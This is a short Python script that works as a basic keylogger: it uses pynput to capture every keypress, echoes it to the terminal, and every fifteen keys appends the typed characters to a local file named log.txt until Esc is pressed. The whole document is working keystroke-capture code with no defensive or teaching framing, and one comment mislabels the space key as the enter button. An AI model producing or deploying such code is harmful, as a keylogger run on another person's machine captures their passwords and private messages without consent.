from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key) #Put all keys in an array
    count += 1
    print("{0} pressed".format(key)) #just putting in the terminal if things are going right
    if count >= 15: # If keys are equal 15 the program will save. For the program to update and we won't lose anything if it closes
        count =0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "") #Make it more readable
            if k.find("space") > 0: #recognize enter button
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
